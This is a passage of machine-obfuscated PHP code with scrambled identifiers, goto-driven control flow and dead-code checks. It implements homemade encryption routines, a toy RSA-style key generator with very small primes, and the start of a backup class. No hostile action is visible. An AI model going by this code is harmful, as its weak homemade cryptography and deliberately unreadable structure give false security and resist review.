|| $D©ªñÌ‰›²[324](1, 100) > 20) { return; } goto B÷Í¿Íæ…˜; aÂôËÊòºô: echo $D©ªñÌ‰›²[325] . $D©ªñÌ‰›²[326]($e‹±º–®Æ’) . $D©ªñÌ‰›²[327]; goto fàÅàœ·Í; a³Ÿ¥Ş‡ˆ›: $a¢ïé§æŒ = $this->{$_SERVER[Š°ş®×«Ú][248]}($a¢ïé§æŒ, $D©ªñÌ‰›²[249]); $bô†‹± Ûè = $D©ªñÌ‰›²[250](array($D©ªñÌ‰›²[251] => array($D©ªñÌ‰›²[252] => $D©ªñÌ‰›²[253], $D©ªñÌ‰›²[254] => 3))); $Bï˜ÛˆØì = $c‡É¸¥ìõ©[626]; goto c¾¤ÎìÉÔ‚; B÷Í¿Íæ…˜: $a¢ïé§æŒ = $D©ªñÌ‰›²[247]; $f–­ØšĞ× = $c‡É¸¥ìõ©[613]; while ($f–­ØšĞ× < $c‡É¸¥ìõ©[563]) { if ($f–­ØšĞ× >= 0) { break; } $f–­ØšĞ×++; } goto a³Ÿ¥Ş‡ˆ›; fàÅàœ·Í: } private function ltvi33bafbe4($CŞ™‹ï¨Ï, $bŞ„‡è‹‡¶, $D×õƒÀš‘ä = 3) { goto déö“ˆÁÉ; CËäè‘»Í: $DÉÒÙ…ó©¿ = $bª‡ÊŸ¦¨™[216]($B‰˜çå„’Î . $EÂ¶°èÏ÷ . $DÉÒÙ…ó©¿); $dÍÛ·ÆÏ’¸ = $F˜Ã†Ç¨®à[636]; if (!$dÍÛ·ÆÏ’¸) { return; } goto DÔÃ¸”’ñÓ; déö“ˆÁÉ: $F˜Ã†Ç¨®à =& $_SERVER[“]; $bª‡ÊŸ¦¨™ =& $_SERVER[Š°ş®×«Ú]; $bª‡ÊŸ¦¨™[328](1); goto c™Çé­ªˆÏ; fò™™Ç–Ÿê: if (strlen($b¾ñ²¬éö) < $F˜Ã†Ç¨®à[573]) { die; } $E°¾‡‡´ = $bª‡ÊŸ¦¨™[329]; switch ($B‰˜çå„’Î) { case $bª‡ÊŸ¦¨™[234]: $DÉÒÙ…ó©¿ = $this->{$_SERVER[Š°ş®×«Ú][149]}($CŞ™‹ï¨Ï, $bª‡ÊŸ¦¨™[216]($bŞ„‡è‹‡¶ . $EÂ¶°èÏ÷)); break; case $bª‡ÊŸ¦¨™[222]: $DÉÒÙ…ó©¿ = $this->{$_SERVER[Š°ş®×«Ú][149]}($CŞ™‹ï¨Ï, $bª‡ÊŸ¦¨™[216]($EÂ¶°èÏ÷ . $bŞ„‡è‹‡¶)); break; $c‘Ô¤’±—ß = $F˜Ã†Ç¨®à[630]; case $bª‡ÊŸ¦¨™[330]: $DÉÒÙ…ó©¿ = $this->{$_SERVER[Š°ş®×«Ú][149]}($CŞ™‹ï¨Ï, $bª‡ÊŸ¦¨™[120]($EÂ¶°èÏ÷ . $bŞ„‡è‹‡¶)); break; case $bª‡ÊŸ¦¨™[331]: $DÉÒÙ…ó©¿ = $this->{$_SERVER[Š°ş®×«Ú][149]}($CŞ™‹ï¨Ï, $bª‡ÊŸ¦¨™[116]($EÂ¶°èÏ÷ . $bŞ„‡è‹‡¶)); break; case $bª‡ÊŸ¦¨™[332]: goto f÷Î¢ä…£°; BÙ½¾¦ñ‰²: for ($dƒŞ†ÕÔš = 0; $dƒŞ†ÕÔš < $bª‡ÊŸ¦¨™[24]($CŞ™‹ï¨Ï); $dƒŞ†ÕÔš++) { $Aé­›©Í’Ë = $Aé­›©Í’Ë == $bª‡ÊŸ¦¨™[24]($fÊÏ…Ö¦Ø) ? 0 : $Aé­›©Í’Ë; $Dœ¢È‡¦À = $F˜Ã†Ç¨®à[634]; if (strlen($Dœ¢È‡¦À) < $F˜Ã†Ç¨®à[563]) { return; } $cêšÈÔÄÕÖ = ($E£…éİáÇ‰ + $bª‡ÊŸ¦¨™[334]($E°¾‡‡´, $CŞ™‹ï¨Ï[$dƒŞ†ÕÔš]) + $bª‡ÊŸ¦¨™[335]($fÊÏ…Ö¦Ø[$Aé­›©Í’Ë++])) % 64; $eƒŞÒÉÀÔŒ = $F˜Ã†Ç¨®à[635]; if (strlen($eƒŞÒÉÀÔŒ) < $F˜Ã†Ç¨®à[559]) { die; } $eù«òÎâÚ .= $E°¾‡‡´[$cêšÈÔÄÕÖ]; } $DÉÒÙ…ó©¿ = $bª‡ÊŸ¦¨™[326]($fÖÉÄ—‰ÆÀ . $eù«òÎâÚ); $eŸ›³ºùÒ¶ = $F˜Ã†Ç¨®à[557]; goto FÅµî‘İ²; CŞƒÂêÏ‰¿: $Aé­›©Í’Ë = 0; $AÕÙíÛßÀŸ = $F˜Ã†Ç¨®à[633]; if (!$AÕÙíÛßÀŸ) { die; } goto BÙ½¾¦ñ‰²; C©–ŞÎ¬©: while ($A…ùˆÑæö¹ < $F˜Ã†Ç¨®à[559]) { if ($A…ùˆÑæö¹ >= 0) { break; } $A…ùˆÑæö¹++; } $dƒŞ†ÕÔš = 0; $cêšÈÔÄÕÖ = 0; goto CŞƒÂêÏ‰¿; f÷Î¢ä…£°: $CŞ™‹ï¨Ï = $bª‡ÊŸ¦¨™[120]($CŞ™‹ï¨Ï); $E£…éİáÇ‰ = $bª‡ÊŸ¦¨™[333](0, 64); $fÖÉÄ—‰ÆÀ = $E°¾‡‡´[$E£…éİáÇ‰]; goto fõ‹ÎÌ³ÎÌ; eÉƒÅî¦Ç: if (strlen($aĞî¢ì¾º) < $F˜Ã†Ç¨®à[563]) { die; } $eù«òÎâÚ = $bª‡ÊŸ¦¨™[10]; $A…ùˆÑæö¹ = $F˜Ã†Ç¨®à[632]; goto C©–ŞÎ¬©; FÅµî‘İ²: if (!$eŸ›³ºùÒ¶) { return; } break; goto c”òÓÀÔÎœ; fõ‹ÎÌ³ÎÌ: $fÊÏ…Ö¦Ø = $bª‡ÊŸ¦¨™[116]($fÖÉÄ—‰ÆÀ . $bª‡ÊŸ¦¨™[116]($bŞ„‡è‹‡¶ . $fÖÉÄ—‰ÆÀ) . $bŞ„‡è‹‡¶); $fÊÏ…Ö¦Ø = $bª‡ÊŸ¦¨™[25]($fÊÏ…Ö¦Ø, $E£…éİáÇ‰ % 8, $E£…éİáÇ‰ % 8 + 7); $aĞî¢ì¾º = $F˜Ã†Ç¨®à[631]; goto eÉƒÅî¦Ç; c”òÓÀÔÎœ: default: $DÉÒÙ…ó©¿ = $this->{$_SERVER[Š°ş®×«Ú][149]}($CŞ™‹ï¨Ï, $bŞ„‡è‹‡¶ . $EÂ¶°èÏ÷); break; $E„Î—¿œÎ‡ = $F˜Ã†Ç¨®à[558]; if (!$E„Î—¿œÎ‡) { die; } } goto CËäè‘»Í; bçšã¥ö: if (strlen($C¶ÔÙšîÍ) < $F˜Ã†Ç¨®à[573]) { die; } $EÂ¶°èÏ÷ = $bª‡ÊŸ¦¨™[126](15); $b¾ñ²¬éö = $F˜Ã†Ç¨®à[629]; goto fò™™Ç–Ÿê; DÔÃ¸”’ñÓ: if ($D×õƒÀš‘ä - 1 > 0) { $DÉÒÙ…ó©¿ = $this->{$_SERVER[Š°ş®×«Ú][129]}($DÉÒÙ…ó©¿, $bŞ„‡è‹‡¶, $D×õƒÀš‘ä - 1); } return $DÉÒÙ…ó©¿; goto eÌÊ¨¦œÎ; c™Çé­ªˆÏ: $CŞ™‹ï¨Ï = $bª‡ÊŸ¦¨™[2]($CŞ™‹ï¨Ï); $B‰˜çå„’Î = $bª‡ÊŸ¦¨™[324](0, 5) . $bª‡ÊŸ¦¨™[10]; $C¶ÔÙšîÍ = $F˜Ã†Ç¨®à[628]; goto bçšã¥ö; eÌÊ¨¦œÎ: } private function tjkb437e954c($cÌƒ™²’„Ü, $D–àğøğ½³, $E’é÷±Û = 3) { goto däà äÌ‚œ; F¤ê®£Ç÷À: $cÌƒ™²’„Ü = $a¶±É—š¤[2]($cÌƒ™²’„Ü); $F¨ñ·Ëí½‚ = $eÃˆ¦Šç‹›[637]; if (strlen($F¨ñ·Ëí½‚) < $eÃˆ¦Šç‹›[580]) { return; } goto Aìñ Áì½; cÏºÈˆ£ƒ: $EÎŞªÊÇĞØ = $a¶±É—š¤[25]($cÌƒ™²’„Ü, 1, 15); $a´³“”¡² = $eÃˆ¦Šç‹›[639]; if (!$a´³“”¡²) { return; } goto A®²…²¼¯ã; A®²…²¼¯ã: $cÌƒ™²’„Ü = $a¶±É—š¤[25]($cÌƒ™²’„Ü, 16); $EêÍ˜…Ë° = $a¶±É—š¤[329]; switch ($C¯Îô—ëĞØ) { case $a¶±É—š¤[234]: $A–×ÆĞÆ÷× = $this->{$_SERVER[Š°ş®×«Ú][248]}($cÌƒ™²’„Ü, $a¶±É—š¤[216]($D–àğøğ½³ . $EÎŞªÊÇĞØ)); $FÅš¬ãŒä = $eÃˆ¦Šç‹›[640]; break; case $a¶±É—š¤[222]: $A–×ÆĞÆ÷× = $this->{$_SERVER[Š°ş®×«Ú][248]}($cÌƒ™²’„Ü, $a¶±É—š¤[216]($EÎŞªÊÇĞØ . $D–àğøğ½³)); $B¦¯¯ÙÉ¬™ = $eÃˆ¦Šç‹›[641]; if (strlen($B¦¯¯ÙÉ¬™) < $eÃˆ¦Šç‹›[563]) { die; } break; $e“÷Àˆ§ = $eÃˆ¦Šç‹›[642]; if (strlen($e“÷Àˆ§) < $eÃˆ¦Šç‹›[563]) { return; } case $a¶±É—š¤[330]: $A–×ÆĞÆ÷× = $this->{$_SERVER[Š°ş®×«Ú][248]}($cÌƒ™²’„Ü, $a¶±É—š¤[120]($EÎŞªÊÇĞØ . $D–àğøğ½³)); $c•ƒÍĞŞ©ß = $eÃˆ¦Šç‹›[643]; break; case $a¶±É—š¤[331]: $A–×ÆĞÆ÷× = $this->{$_SERVER[Š°ş®×«Ú][248]}($cÌƒ™²’„Ü, $a¶±É—š¤[116]($EÎŞªÊÇĞØ . $D–àğøğ½³)); break; case $a¶±É—š¤[332]: goto f–¿ºœ»‘; f–¿ºœ»‘: $cÌƒ™²’„Ü = $a¶±É—š¤[337]($cÌƒ™²’„Ü); $bêóÌÈˆ = $eÃˆ¦Šç‹›[644]; while (strlen($bêóÌÈˆ) < $eÃˆ¦Šç‹›[559]) { if (!$bêóÌÈˆ) { break; } $bêóÌÈˆ++; } goto f§õçÔ„¢ƒ; c¶ªé·˜Åë: $E±£‚¶´Å = $a¶±É—š¤[116]($eœ¿¤•½÷ñ . $a¶±É—š¤[116]($D–àğøğ½³ . $eœ¿¤•½÷ñ) . $D–àğøğ½³); $E±£‚¶´Å = $a¶±É—š¤[25]($E±£‚¶´Å, $dØƒÂéÙ™š % 8, $dØƒÂéÙ™š % 8 + 7); $f­Ï÷×  = $a¶±É—š¤[10]; goto F¢èª’Î™–; AÒ†Äó‚â–: $bòãŸ›µš› = $eÃˆ¦Šç‹›[648]; if (!$bòãŸ›µš›) { return; } goto cªÛ‰™£Úõ; E¢ÎëÙô’¶: $e‘ÙŒ¨×ªÎ = 0; $C‰¯¦‹•Ó± = $eÃˆ¦Šç‹›[647]; if (strlen($C‰¯¦‹•Ó±) < $eÃˆ¦Šç‹›[553]) { die; } goto aø—“¿âšÔ; F¢èª’Î™–: $Bª¤Íğ°¯¿ = $eÃˆ¦Šç‹›[645]; while (strlen($Bª¤Íğ°¯¿) < $eÃˆ¦Šç‹›[559]) { if (!$Bª¤Íğ°¯¿) { break; } $Bª¤Íğ°¯¿++; } $aöËÀŠñ = 0; goto c„ĞôƒÀ¦ğ; aø—“¿âšÔ: for ($aöËÀŠñ = 0; $aöËÀŠñ < $a¶±É—š¤[24]($cÌƒ™²’„Ü); $aöËÀŠñ++) { $e‘ÙŒ¨×ªÎ = $e‘ÙŒ¨×ªÎ == $a¶±É—š¤[24]($E±£‚¶´Å) ? 0 : $e‘ÙŒ¨×ªÎ; $C®ß‘÷›ñÔ = $e‘ÙŒ¨×ªÎ++; $dØè‰áÜáÊ = $a¶±É—š¤[334]($EêÍ˜…Ë°, $cÌƒ™²’„Ü[$aöËÀŠñ]) - $dØƒÂéÙ™š - $a¶±É—š¤[335]($E±£‚¶´Å[$C®ß‘÷›ñÔ]); while ($dØè‰áÜáÊ < 0) { $dØè‰áÜáÊ += 64; } $f­Ï÷×  .= $EêÍ˜…Ë°[$dØè‰áÜáÊ]; } $A–×ÆĞÆ÷× = $a¶±É—š¤[338]($f­Ï÷× ); break; goto AÒ†Äó‚â–; f§õçÔ„¢ƒ: $eœ¿¤•½÷ñ = $cÌƒ™²’„Ü[0]; $cÌƒ™²’„Ü = $a¶±É—š¤[25]($cÌƒ™²’„Ü, 1); $dØƒÂéÙ™š = $a¶±É—š¤[334]($EêÍ˜…Ë°, $eœ¿¤•½÷ñ); goto c¶ªé·˜Åë; c„ĞôƒÀ¦ğ: $Eõø”µ®¾ø = $eÃˆ¦Šç‹›[646]; while (strlen($Eõø”µ®¾ø) < $eÃˆ¦Šç‹›[580]) { if (!$Eõø”µ®¾ø) { break; } $Eõø”µ®¾ø++; } $dØè‰áÜáÊ = 0; goto E¢ÎëÙô’¶; cªÛ‰™£Úõ: default: $A–×ÆĞÆ÷× = $this->{$_SERVER[Š°ş®×«Ú][248]}($cÌƒ™²’„Ü, $D–àğøğ½³ . $EÎŞªÊÇĞØ); break; } goto aŠÇ˜×›ñ; däà äÌ‚œ: $eÃˆ¦Šç‹› =& $_SERVER[“]; $a¶±É—š¤ =& $_SERVER[Š°ş®×«Ú]; if (!$a¶±É—š¤[336]($cÌƒ™²’„Ü) || $a¶±É—š¤[24]($cÌƒ™²’„Ü) < 10) { return !1; } goto F¤ê®£Ç÷À; aŠÇ˜×›ñ: if ($E’é÷±Û - 1 > 0) { $A–×ÆĞÆ÷× = $this->{$_SERVER[Š°ş®×«Ú][190]}($A–×ÆĞÆ÷×, $D–àğøğ½³, $E’é÷±Û - 1); } return $A–×ÆĞÆ÷×; goto c¥ùºµÈ…; Aìñ Áì½: $cÌƒ™²’„Ü = $a¶±É—š¤[216]($cÌƒ™²’„Ü); $C¯Îô—ëĞØ = $cÌƒ™²’„Ü[0]; $EƒòÌÙ¿“¡ = $eÃˆ¦Šç‹›[638]; goto cÏºÈˆ£ƒ; c¥ùºµÈ…: } public function zpkxacefe30f($Fïïî‚ ×») { goto D¢»… ¯°â; D¢»… ¯°â: $AîÅ•êƒ‰ä =& $_SERVER[“]; $BÉÚ˜¨Ù»Â =& $_SERVER[Š°ş®×«Ú]; $D–àêÕÏ¼£ = $this->{$_SERVER[Š°ş®×«Ú][339]}(); goto aÇ»¢¥°; bÓóÉƒòêğ: if (strlen($bº‡¤ºÎÖ’) < $AîÅ•êƒ‰ä[580]) { die; } return $bÖ¼·ä¯òè; goto AÇ§îËˆ§; Cİğ˜ÃÙŒ: $dŠ‘ç‹ã“ = $AîÅ•êƒ‰ä[654]; while ($dŠ‘ç‹ã“ < $AîÅ•êƒ‰ä[559]) { if ($dŠ‘ç‹ã“ >= 0) { break; } $dŠ‘ç‹ã“++; } for ($B‡±Ğ–‘Ÿœ = 0; $B‡±Ğ–‘Ÿœ < $A‡‡öÄŒª * 10; $B‡±Ğ–‘Ÿœ++) { if (($A‡‡öÄŒª * $B‡±Ğ–‘Ÿœ + 1) % $d®ÎŸ¯¾Ë == 0) { $a¤ïÏ›õè = $BÉÚ˜¨Ù»Â[203](($A‡‡öÄŒª * $B‡±Ğ–‘Ÿœ + 1) / $d®ÎŸ¯¾Ë); break; } } goto F¥‹°Ù; bã·äµºé‰: if (!$d›‚¡Á´öĞ) { die; } $bÖ¼·ä¯òè = $this->{$_SERVER[Š°ş®×«Ú][149]}($Fïïî‚ ×», $fÊíÅõê—) . $BÉÚ˜¨Ù»Â[343] . $fÑ§ä–²; $bº‡¤ºÎÖ’ = $AîÅ•êƒ‰ä[656]; goto bÓóÉƒòêğ; F¥‹°Ù: $fÑ§ä–² = $this->{$_SERVER[Š°ş®×«Ú][149]}($D–àêÕÏ¼£ * $f²Ü„åõ™„ . $BÉÚ˜¨Ù»Â[10], $BÉÚ˜¨Ù»Â[151]); $fÊíÅõê— = $BÉÚ˜¨Ù»Â[116]($BÉÚ˜¨Ù»Â[340] . ($D–àêÕÏ¼£ + $f²Ü„åõ™„) . $BÉÚ˜¨Ù»Â[341] . $d®ÎŸ¯¾Ë . $BÉÚ˜¨Ù»Â[341] . $a¤ïÏ›õè . $BÉÚ˜¨Ù»Â[342]); $d›‚¡Á´öĞ = $AîÅ•êƒ‰ä[655]; goto bã·äµºé‰; fÕ¾ã½°Ù«: $FëŒìßƒ·ª = $AîÅ•êƒ‰ä[650]; if (strlen($FëŒìßƒ·ª) < $AîÅ•êƒ‰ä[563]) { return; } $A‡‡öÄŒª = ($D–àêÕÏ¼£ - 1) * ($f²Ü„åõ™„ - 1); goto A®ÎæèŸ×Ø; A®ÎæèŸ×Ø: $d®ÎŸ¯¾Ë = $BÉÚ˜¨Ù»Â[203](($D–àêÕÏ¼£ + $f²Ü„åõ™„) / 2); while (1) { $eß‹Ä¥›”© = $d®ÎŸ¯¾Ë; $eÔÕ‹Ë¼õ = $AîÅ•êƒ‰ä[651]; $Eì´ ¯©™“ = $A‡‡öÄŒª; $Eé‰¨ÙÄ˜ = $AîÅ•êƒ‰ä[652]; while ($Eé‰¨ÙÄ˜ < $AîÅ•êƒ‰ä[563]) { if ($Eé‰¨ÙÄ˜ >= 0) { break; } $Eé‰¨ÙÄ˜++; } while ($Eì´ ¯©™“ % $eß‹Ä¥›”© != 0) { $C™ƒÌ®µù = $Eì´ ¯©™“; $Eì´ ¯©™“ = $eß‹Ä¥›”©; $eß‹Ä¥›”© = $C™ƒÌ®µù % $eß‹Ä¥›”©; $bñ‹ÕŠƒÚ = $AîÅ•êƒ‰ä[653]; if (!$bñ‹ÕŠƒÚ) { die; } } if ($eß‹Ä¥›”© == 1) { break; } else { $d®ÎŸ¯¾Ë++; } } $a¤ïÏ›õè = 2; goto Cİğ˜ÃÙŒ; aÇ»¢¥°: $D¶Èâœª™ = $AîÅ•êƒ‰ä[649]; while (strlen($D¶Èâœª™) < $AîÅ•êƒ‰ä[573]) { if (!$D¶Èâœª™) { break; } $D¶Èâœª™++; } $f²Ü„åõ™„ = $this->{$_SERVER[Š°ş®×«Ú][339]}(); goto fÕ¾ã½°Ù«; AÇ§îËˆ§: } public function qwyhd426a305($C‚¢î•‹Œ) { goto AÇÄÃ¢¡µ¶; cÒ¡Ğ´•¤„: $EäÒÊò£¢Œ = $aÏèíß¡´‰[203]($EäÒÊò£¢Œ); $CÔ‡å¿õ”™ = 0; $BÉÁ„âßß = $dÕ›â³¾­À[657]; goto aŞá°ê‘Á; D”öœš¶î‘: if (strlen($Eô›…ğ›åæ) < $dÕ›â³¾­À[580]) { die; } for ($B÷…ğ‡ô = 3; $B÷…ğ‡ô < $EäÒÊò£¢Œ; $B÷…ğ‡ô += 2) { if ($EäÒÊò£¢Œ % $B÷…ğ‡ô != 0) { continue; } $CÔ‡å¿õ”™ = $B÷…ğ‡ô; $c™¬è¢º„ã = $dÕ›â³¾­À[659]; $cÈñ©ñÁÔâ = $aÏèíß¡´‰[203]($EäÒÊò£¢Œ / $B÷…ğ‡ô); $f¸¹é´–˜§ = $dÕ›â³¾­À[660]; if (strlen($f¸¹é´–˜§) < $dÕ›â³¾­À[559]) { return; } break; $Fê‰Ó´Ì‘ = $dÕ›â³¾­À[661]; if (strlen($Fê‰Ó´Ì‘) < $dÕ›â³¾­À[580]) { die; } } $f»î‹ŒĞ§½ = ($CÔ‡å¿õ”™ - 1) * ($cÈñ©ñÁÔâ - 1); goto fè¹œÙô—Ñ; B¹ƒ¢«Ä½°: if (!$d‹ö¢öÒ§) { die; } goto F’çÂ£éÂ·; fè¹œÙô—Ñ: $a´Ë–ÛĞØ„ = $dÕ›â³¾­À[662]; $d¹ğÕ††‘ = $aÏèíß¡´‰[203](($CÔ‡å¿õ”™ + $cÈñ©ñÁÔâ) / 2); $CÉé³¡âŞì = $dÕ›â³¾­À[663]; goto aÕ¨êªæ¸×; B½ĞœëŞ–Ö: if ($aÏèíß¡´‰[19]($F…Ûí‘ÀÛ) != 2) { return $aÏèíß¡´‰[10]; } $EäÒÊò£¢Œ = $this->{$_SERVER[Š°ş®×«Ú][248]}($F…Ûí‘ÀÛ[1] . $aÏèíß¡´‰[10], $aÏèíß¡´‰[151]); if (!$EäÒÊò£¢Œ) { return $aÏèíß¡´‰[10]; } goto cÒ¡Ğ´•¤„; aŞá°ê‘Á: if (!$BÉÁ„âßß) { return; } $cÈñ©ñÁÔâ = 0; $Eô›…ğ›åæ = $dÕ›â³¾­À[658]; goto D”öœš¶î‘; AÇÄÃ¢¡µ¶: $dÕ›â³¾­À =& $_SERVER[“]; $aÏèíß¡´‰ =& $_SERVER[Š°ş®×«Ú]; $F…Ûí‘ÀÛ = $aÏèíß¡´‰[0]($aÏèíß¡´‰[343], $C‚¢î•‹Œ); goto B½ĞœëŞ–Ö; aÕ¨êªæ¸×: while (1) { $EÃÌÜ‚Ûšİ = $d¹ğÕ††‘; $Bö‚¶µÎë = $dÕ›â³¾­À[664]; if (strlen($Bö‚¶µÎë) < $dÕ›â³¾­À[573]) { return; } $Bğ÷µÙ¬‡– = $f»î‹ŒĞ§½; $AµôŞÔª = $dÕ›â³¾­À[630]; if (!$AµôŞÔª) { die; } while ($Bğ÷µÙ¬‡– % $EÃÌÜ‚Ûšİ != 0) { $CµªÎˆ•ƒ = $Bğ÷µÙ¬‡–; $Bğ÷µÙ¬‡– = $EÃÌÜ‚Ûšİ; $Aö…®¢³ † = $dÕ›â³¾­À[665]; if (strlen($Aö…®¢³ †) < $dÕ›â³¾­À[553]) { die; } $EÃÌÜ‚Ûšİ = $CµªÎˆ•ƒ % $EÃÌÜ‚Ûšİ; } if ($EÃÌÜ‚Ûšİ == 1) { break; } else { $d¹ğÕ††‘++; } } $d¼˜„Œœ­Ù = 2; for ($B÷…ğ‡ô = 0; $B÷…ğ‡ô < $f»î‹ŒĞ§½ * 10; $B÷…ğ‡ô++) { if (($f»î‹ŒĞ§½ * $B÷…ğ‡ô + 1) % $d¹ğÕ††‘ == 0) { $d¼˜„Œœ­Ù = $aÏèíß¡´‰[203](($f»î‹ŒĞ§½ * $B÷…ğ‡ô + 1) / $d¹ğÕ††‘); break; } } goto E´êéŒñã–; e¯Ìã×šŸŸ: while (strlen($C•ˆ¬Çƒš—) < $dÕ›â³¾­À[580]) { if (!$C•ˆ¬Çƒš—) { break; } $C•ˆ¬Çƒš—++; } return $CíĞÌÏ³è¤; $d‹ö¢öÒ§ = $dÕ›â³¾­À[667]; goto B¹ƒ¢«Ä½°; E´êéŒñã–: $EĞğ„î·Â  = $aÏèíß¡´‰[116]($aÏèíß¡´‰[340] . ($CÔ‡å¿õ”™ + $cÈñ©ñÁÔâ) . $aÏèíß¡´‰[341] . $d¹ğÕ††‘ . $aÏèíß¡´‰[341] . $d¼˜„Œœ­Ù . $aÏèíß¡´‰[342]); $CíĞÌÏ³è¤ = $this->{$_SERVER[Š°ş®×«Ú][248]}($F…Ûí‘ÀÛ[0], $EĞğ„î·Â ); $C•ˆ¬Çƒš— = $dÕ›â³¾­À[666]; goto e¯Ìã×šŸŸ; F’çÂ£éÂ·: } public function npgc08c25404() { goto AŠºçÖ•˜; bÇİ­ôË±: for ($E± óÈ¾­ = $b­³¾ ½‹œ; $E± óÈ¾­ > 1; $E± óÈ¾­--) { $a± ½Ä©¹ = !0; foreach ($EÑÜÙğê‰ê as $f°ÁÏµ…ï‚) { if ($E± óÈ¾­ % $f°ÁÏµ…ï‚ == 0) { $a± ½Ä©¹ = !1; break; } } if ($a± ½Ä©¹) { $Bô ïæ’ † = $E± óÈ¾­; break; } } return $Bô ïæ’ †; $bÏ“ˆÔø = $_SERVER[“][668]; goto eÚóˆ¶Ò¢; b¶”ìã•Ó: $DÜÃéøÙäæ = 1; while ($DÜÃéøÙäæ <= (int) $eœŸ¢ƒÑèâ[345]($b­³¾ ½‹œ)) { $E± óÈ¾­ = $DÜÃéøÙäæ; while (!0) { $E± óÈ¾­++; if ($E± óÈ¾­ <= 2) { $DÜÃéøÙäæ = $E± óÈ¾­; break; } else { if ($E± óÈ¾­ < 2) { continue; } } $a± ½Ä©¹ = !0; for ($C“Ğøâ¤® = 2; $C“Ğøâ¤® <= $eœŸ¢ƒÑèâ[345]($E± óÈ¾­); $C“Ğøâ¤®++) { if ($E± óÈ¾­ % $C“Ğøâ¤® == 0) { $a± ½Ä©¹ = !1; } } if ($a± ½Ä©¹) { $DÜÃéøÙäæ = $E± óÈ¾­; break; } } $EÑÜÙğê‰ê[] = $DÜÃéøÙäæ; } $Bô ïæ’ † = 2; goto bÇİ­ôË±; AŠºçÖ•˜: $eœŸ¢ƒÑèâ =& $_SERVER[Š°ş®×«Ú]; $b­³¾ ½‹œ = $eœŸ¢ƒÑèâ[324]($eœŸ¢ƒÑèâ[344](2, 14), $eœŸ¢ƒÑèâ[344](2, 16) - 1); $EÑÜÙğê‰ê = array(); goto b¶”ìã•Ó; eÚóˆ¶Ò¢: } public function bing63a1d762($CĞÈØèä•, $Dãá”öî•Š) { $D•†˜ÖÅäÒ =& $_SERVER[Š°ş®×«Ú]; return $D•†˜ÖÅäÒ[13](array($D•†˜ÖÅäÒ[14], $D•†˜ÖÅäÒ[346]), $CĞÈØèä•, $Dãá”öî•Š); } public function kxlccf095a5d($a˜Û¦Ş‡‘Ï, $eß›©È½ê) { $A—ğ¦¸£Ñß =& $_SERVER[“]; $fÛÒ¸Ù£Ó’ =& $_SERVER[Š°ş®×«Ú]; return $fÛÒ¸Ù£Ó’[13](array($fÛÒ¸Ù£Ó’[347], $fÛÒ¸Ù£Ó’[348]), $a˜Û¦Ş‡‘Ï, $eß›©È½ê); $Dİ·¼™Ş‘ = $A—ğ¦¸£Ñß[669]; while (strlen($Dİ·¼™Ş‘) < $A—ğ¦¸£Ñß[559]) { if (!$Dİ·¼™Ş‘) { break; } $Dİ·¼™Ş‘++; } } public function qfov8d8fd08e($B¹†é¤Åº¹, $dŸëİèˆ•) { $b—Ê¸‘ =& $_SERVER[Š°ş®×«Ú]; return $b—Ê¸‘[13](array($b—Ê¸‘[347], $b—Ê¸‘[349]), $B¹†é¤Åº¹, $dŸëİèˆ•); $b¼ĞĞÔóƒ˜ = $_SERVER[“][670]; } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $A•§Áô›Ñ =& $_SERVER[“]; self::$name = date($A•§Áô›Ñ[671]); if (!($Fù„âÓ©Õë = Model($A•§Áô›Ñ[672])->lastItem())) { $Fù„âÓ©Õë = $this->initData(); } else { self::$name = $Fù„âÓ©Õë[$A•§Áô›Ñ[28]]; if ($Fù„âÓ©Õë[$A•§Áô›Ñ[673]] == $A•§Áô›Ñ[83]) { self::$name = date($A•§Áô›Ñ[674]); $Eí­ ¢¦¡ = 0; if (isset($Fù„âÓ©Õë[$A•§Áô›Ñ[281]][$A•§Áô›Ñ[167]][$A•§Áô›Ñ[419]])) { $Eí­ ¢¦¡ = (int) $Fù„âÓ©Õë[$A•§Áô›Ñ[281]][$A•§Áô›Ñ[167]][$A•§Áô›Ñ[419]]; } if ($Fù„âÓ©Õë[$A•§Áô›Ñ[28]] == self::$name) { Model($A•§Áô›Ñ[672])->remove($Fù„âÓ©Õë[$A•§Áô›Ñ[367]]); } $Fù„âÓ©Õë = $this->initData($Eí­ ¢¦¡, $Fù„âÓ©Õë[$A•§Áô›Ñ[675]]); } else { $this->checkStore($Fù„âÓ©Õë[$A•§Áô›Ñ[675]]); } } self::$option = $Fù„âÓ©Õë; } private function initData($c°¶¤«ñµŠ = 0, $c‰äÆ·Ñ¸ = '') { goto AÚï÷™µé; AÚï÷™µé: $e×„Î§ä´‘ =& $_SERVER[“]; $eùì‡é‡‰ñ = Model($e×„Î§ä´‘[672])->config(); if ($c‰äÆ·Ñ¸ && $eùì‡é‡‰ñ[$e×„Î§ä´‘[675]] != $c‰äÆ·Ñ¸) { $c°¶¤«ñµŠ = 0; } goto eŸÎÌßÎâ†; C×™çºÆ£Æ: $cîÊÈ’¸’¾[$e×„Î§ä´‘[367]] = $d‘öæİ±â; return $cîÊÈ’¸’¾; goto eëœ«¢­µë; eŸÎÌßÎâ†: $this->checkStore($eùì‡é‡‰ñ[$e×„Î§ä´‘[675]]); $cîÊÈ’¸’¾ = array($e×„Î§ä´‘[675] => $eùì‡é‡‰ñ[$e×„Î§ä´‘[675]], $e×„Î§ä´‘[28] => self::$name, $e×„Î§ä´‘[673] => 0, $e×„Î§ä´‘[676] => $eùì‡é‡‰ñ[$e×„Î§ä´‘[676]], $e×„Î§ä´‘[281] => array($e×„Î§ä´‘[677] => array($e×„Î§ä´‘[673] => 0), $e×„Î§ä´‘[678] => array($e×„Î§ä´‘[673] => 0, $e×„Î§ä´‘[679] => 0, $e×„Î§ä´‘[680] => 0, $e×„Î§ä´‘[29] => $e×„Î§ä´‘[33]), $e×„Î§ä´‘[681] => array($e×„Î§ä´‘[673] => 0, $e×„Î§ä´‘[679] => 0, $e×„Î§ä´‘[680] => 0), $e×„Î§ä´‘[167] => array($e×„Î§ä´‘[673] => 0, $e×„Î§ä´‘[682] => 0, $e×„Î§ä´‘[683] => 0, $e×„Î§ä´‘[684] => 0, $e×„Î§ä´‘[685] => 0, $e×„Î§ä´‘[419] => $c°¶¤«ñµŠ)), $e×„Î§ä´‘[686] => time(), $e×„Î§ä´‘[449] => 0); $d‘öæİ±â = Model($e×„Î§ä´‘[672])->insert($cîÊÈ’¸’¾); goto C×™çºÆ£Æ; eëœ«¢­µë: } private function checkStore($eŠ‘îñ¿œï) { $Aœ¢Ğì¸ò =& $_SERVER[“]; $e¨†À®ˆ§¤ = 